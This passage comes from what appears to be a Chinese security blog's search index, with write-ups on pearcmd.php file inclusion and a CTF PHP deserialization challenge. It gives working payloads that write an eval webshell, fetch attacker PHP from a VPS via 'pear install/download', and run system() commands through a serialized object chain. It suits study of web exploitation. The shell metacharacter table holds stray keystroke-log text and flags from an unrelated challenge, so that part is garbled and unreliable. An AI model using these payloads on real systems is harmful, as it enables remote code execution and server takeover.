alt="pearcmd_p2"></p><p>第一个参数的内容会被写入文件，如果我们将第一个参数换成文件内容的话我们就可以写入可包含的文件了</p><p>payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure><p><img src="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/pearcmd_p3.jpg" alt="pearcmd_p3"></p><p>包含结果：</p><p><img src="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/pearcmd_p4.jpg" alt="pearcmd_p4"></p><p>我们来看下写入的文件</p><p><img src="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/pearcmd_p5.jpg" alt="pearcmd_p5"></p><p>可以看见<code>/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#39;cmd&#39;]);?&gt;</code>整个被作为参数传入了命令行，但是get参数file被正常解析了，这是因为前面说过的即使URL中存在等号，问号后的内容一样会被传入<code>$_SERVER[&#39;argv&#39;]</code></p><h3 id="install"><a href="#install" class="headerlink" title="install"></a>install</h3><p>此方法来自<a href="https://blog.szfszf.top/article/57/">jrXnm师傅的博客</a></p><p>先来看看install的常规用法：</p><p>我在我vps上挂了一个php文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后通过pear下载</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">pear install <span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php<br></code></pre></td></tr></table></figure><p>结果：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">pear install <span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php<br>downloading test1.php ...<br>Starting to download test1.php (20 bytes)<br>....done: 20 bytes<br>Could not get contents of package &quot;/tmp/pear/download/test1.php&quot;. Invalid tgz file.<br>Download of &quot;<span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php&quot; succeeded, but it is not a valid package archive<br>Invalid or missing remote package file<br>install failed<br></code></pre></td></tr></table></figure><p>结果在<code>/tmp/pear/download/</code>目录下有一个<code>test1.php</code></p><p>然后<code>install</code>有<code>--installroot</code>这个选项可以指定他的安装目录，这里可以构造payload远程下载我们的文件了</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:3354/?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php<br></code></pre></td></tr></table></figure><p>这个要被包含的文件就在web目录的<code>&amp;file=/usr/local/lib/php/pearcmd.php\&amp;/tmp/pear/download/</code>下，我们把路径url编码一下再包含</p><p><img src="/2023/10/18/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/pearcmd_p6.jpg" alt="pearcmd_p6"></p><p>成功了</p><h3 id="download"><a href="#download" class="headerlink" title="download"></a>download</h3><p>先查看一下download的用法</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">pear download <span class="hljs-selector-attr">[option]</span> <span class="hljs-selector-attr">[package]</span><br>#这里的option只有一个-Z, <span class="hljs-attr">--nocompress</span>，下载一个未压缩的tar包<br></code></pre></td></tr></table></figure><p>尝试一下下恶意的php文件</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">pear download <span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php<br>downloading test1.php ...<br>Starting to download test1.php (20 bytes)<br>....done: 20 bytes<br>Could not get contents of package &quot;/var/www/html/test1.php&quot;. Invalid tgz file.<br>Download of &quot;<span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php&quot; succeeded, but it is not a valid package archive<br>Invalid or missing remote package file<br>download failed<br></code></pre></td></tr></table></figure><p>虽然提示下载失败，但是直接当前目录留下了php文件</p><p><img src="https://w4rsp1t3.moe/images/pearcmd_p7.jpg" alt="img"></p><p>我们可以尝试一下利用这个<code>download</code></p><p>我构造的payload为</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:3354/?+download+http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php&amp;file=/usr/local/lib/php/pearcmd.php<br></code></pre></td></tr></table></figure><p>当然我提前在服务器上构造好了目录:<code>test1.php&amp;file=/usr/local/lib/php/</code>，将恶意php命名为<code>pearcmd.php</code></p><p>其实可以去掉前面的test1.php，只要在服务器上创建相应的目录就行</p><p>然后直接访问<code>pearcmd.php</code>，成功</p><p>参考</p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html</a></p><p><a href="https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>绕过Linux通配符+单个字符(香山杯php反序列化)</title>
    <link href="/2023/10/14/%E8%BF%87%E6%BB%A4%E9%80%9A%E9%85%8D%E7%AC%A6+%E5%8D%95%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%88%E9%A6%99%E5%B1%B1%E6%9D%AF%EF%BC%89/"/>
    <url>/2023/10/14/%E8%BF%87%E6%BB%A4%E9%80%9A%E9%85%8D%E7%AC%A6+%E5%8D%95%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%88%E9%A6%99%E5%B1%B1%E6%9D%AF%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>题目源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;welcome&#x27;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;Wh0 4m I?&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;name == <span class="hljs-string">&#x27;A_G00d_H4ck3r&#x27;</span>)&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;arg;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G00d</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$shell</span> = <span class="hljs-variable language_">$this</span>-&gt;shell;<br>            <span class="hljs-variable">$cmd</span> = <span class="hljs-variable language_">$this</span>-&gt;cmd;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="hljs-variable">$cmd</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;U R A BAD GUY&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$shell</span>(<span class="hljs-variable">$cmd</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H4ck3r</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;func;<br>            <span class="hljs-variable">$function</span>();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>那么是php反序列化，判断一下顺序</p><p><img src="/2023/10/14/%E8%BF%87%E6%BB%A4%E9%80%9A%E9%85%8D%E7%AC%A6+%E5%8D%95%E4%B8%AA%E5%AD%97%E7%AC%A6%EF%BC%88%E9%A6%99%E5%B1%B1%E6%9D%AF%EF%BC%89/1697366971600.jpg" alt="1697366971600"></p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Welcome</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">G00d</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$shell</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">H4ck3r</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>&#125;<br><span class="hljs-variable">$welcome</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Welcome</span>();<br><span class="hljs-variable">$g00d</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">G00d</span>();<br><span class="hljs-variable">$h4ck3r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">H4ck3r</span>();<br><span class="hljs-variable">$welcome</span>-&gt;name=<span class="hljs-string">&#x27;A_G00d_H4ck3r&#x27;</span>;<br><span class="hljs-variable">$welcome</span>-&gt;arg=<span class="hljs-variable">$h4ck3r</span>;<br><span class="hljs-variable">$g00d</span>-&gt;shell=<span class="hljs-string">&#x27;system&#x27;</span>;<br><span class="hljs-variable">$g00d</span>-&gt;cmd=<span class="hljs-string">&#x27;sort /[e-h]1[!bcdehijkmnopqrstuvwxyz][e-h]&#x27;</span>;<br><span class="hljs-variable">$h4ck3r</span>-&gt;func=<span class="hljs-variable">$g00d</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$welcome</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>但是绕过单个的flag、<code>*</code>和<code>?</code>是一个问题，后来看到了这篇文章</p><p><a href="https://www.secpulse.com/archives/96374.html">https://www.secpulse.com/archives/96374.html</a></p><p>使用通配符绕过</p><table><thead><tr><th>字符</th><th>解释</th></tr></thead><tbody><tr><td>*</td><td>匹配任意长度任意字符</td></tr><tr><td>?</td><td>匹配任意单个字符</td></tr><tr><td>[list]</td><td>匹配指定范围内（list）任意单个字符，也可以是单个字符组成的集合</td></tr><tr><td>[^list]</td><td>匹配指定范围外的任意单个字符或字符集合</td></tr><tr><td>[!list]</td><td>同[^list]</td></tr><tr><td>{str1,str2,…}</td><td>匹配 srt1 或者 srt2 或者更多字符串，也可以是集合</td></tr></tbody></table><p><strong>专用字符集</strong></p><table><thead><tr><th>字符</th><th>意义</th></tr></thead><tbody><tr><td>[:alnum:]</td><td>任意数字或者字母</td></tr><tr><td>[:alpha:]</td><td>任意字母</td></tr><tr><td>[:space:]</td><td>空格</td></tr><tr><td>[:lower:]</td><td>小写字母</td></tr><tr><td>[:digit:]</td><td>任意数字</td></tr><tr><td>[:upper:]</td><td>任意大写字母</td></tr><tr><td>[:cntrl:]</td><td>控制符</td></tr><tr><td>[:graph:]</td><td>图形</td></tr><tr><td>[:print:]</td><td>可打印字符</td></tr><tr><td>[:punct:]</td><td>标点符号</td></tr><tr><td>[:xdigit:]</td><td>十六进制数</td></tr><tr><td>[:blank:]</td><td>空白字符（未验证）</td></tr></tbody></table><p><strong>Linux shell 元字符</strong>，在使用通配符时如果没有进行转义可能就会被辨识为元字符</p><table><thead><tr><th>字符</th><th>作用</th></tr></thead><tbody><tr><td>IFS</td><td>w3lc0m3<SPACE>to<SPACE>newstar<SPACE>ctf<SPACE>2023<SPACE>flag<SPACE>is<SPACE>here<SPACE>vbafjwrisgjadwwiihdgja13882hxbbbna     <CAP><CAP>ff<DEL>lll<DEL><DEL>aaa<DEL><DEL>gggg<DEL><DEL><DEL>{999<DEL><DEL>999<DEL><DEL>11<DEL>9aaa<DEL><DEL><SPACE><SPACE><DEL><DEL>eb2—<DEL><DEL>a450—<DEL><DEL>2f5f<SPACE><SPACE><SPACE><DEL><DEL><DEL>–<DEL>7bfc[unknown][unknown][unknown]-8989<DEL><DEL>dfdf<DEL><DEL>4bfa4bfa<DEL><DEL><DEL><DEL>85848584}}}<DEL><DEL><DEL><DEL><DEL><DEL><DEL>}]<SPACE><SPACE><SPACE><SPACE>nice<SPACE>work!1you<SPACE>got<SPACE>this<SPACE>flagoutput :w3lc0m3<SPACE>to<SPACE>newstar<SPACE>ctf<SPACE>2023<SPACE>flag<SPACE>is<SPACE>here<SPACE>vbafjwrisgjadwwiihdgja13882hxbbbna     <CAP>FLAG{9919AEB2-A450-2F5F-7BFC[UNKNOWN][UNKNOWN][UNKNOWN]-89DF4BFA8584}]<SPACE><SPACE><SPACE><SPACE>NICE<SPACE>WORK!1YOU<SPACE>GOT<SPACE>THIS<SPACE>FLAGflag{9919aeb2-a450-2f5f-7bfc-89df4bfa8584}plaintd></tr><tr><td>CR</td><td>由 &lt; enter &gt; 产生</td></tr><tr><td>&#x3D;</td><td>设定变量</td></tr><tr><td>$</td><td>作变量或运算替换</td></tr><tr><td>&gt;</td><td>重导向标准输出</td></tr><tr><td>&lt;</td><td>重导向标准输入</td></tr><tr><td>|</td><td>命令管线</td></tr><tr><td>&amp;</td><td>重导向文件描述符，或将命令静默执行</td></tr><tr><td>( )</td><td>将其内的命令置于 nested subshell 执行，或用于运算或命令替换</td></tr><tr><td>{ }</td><td>将其内的命令置于 non-named function 中执行，或用在变量替换的界定范围</td></tr><tr><td>;</td><td>在前一个命令结束时，而忽略其返回值，继续执行下一个命令</td></tr><tr><td>&amp;&amp;</td><td>在前一个命令结束时，若返回值为 true，继续执行下一个命令</td></tr><tr><td>||</td><td>在前一个命令结束时，若返回值为 false，继续执行下一个命令</td></tr><tr><td>!</td><td>执行 history 中的命令</td></tr></tbody></table><p>payload：<code>?data=O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:13:&quot;A_G00d_H4ck3r&quot;;s:3:&quot;arg&quot;;O:6:&quot;H4ck3r&quot;:1:&#123;s:4:&quot;func&quot;;O:4:&quot;G00d&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:13:&quot;/bin/[k-m]s /&quot;;&#125;&#125;&#125;</code>（注意<code>ls</code>实际是在<code>/bin/ls</code>目录下的）</p><p>回显bin boot dev etc f1ag home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</p><p><code>?data=O:7:&quot;Welcome&quot;:2:&#123;s:4:&quot;name&quot;;s:13:&quot;A_G00d_H4ck3r&quot;;s:3:&quot;arg&quot;;O:6:&quot;H4ck3r&quot;:1:&#123;s:4:&quot;func&quot;;O:4:&quot;G00d&quot;:2:&#123;s:5:&quot;shell&quot;;s:6:&quot;system&quot;;s:3:&quot;cmd&quot;;s:51:&quot;/usr/bin/sort /[e-h]1[!bcdehijkmnopqrstuvwxyz][e-h]&quot;;&#125;&#125;&#125;</code></p><p><code>flag&#123;6a889acc-e31b-4a1f-b966-28d4fc963192&#125;</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试文章</title>
    <link href="/2023/10/11/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/"/>
    <url>/2023/10/11/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p><img src="/2023/10/11/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/test.png" alt="test"></p><p><img src="/2023/10/11/%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0/1700036779870.png" alt="1700036779870"></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
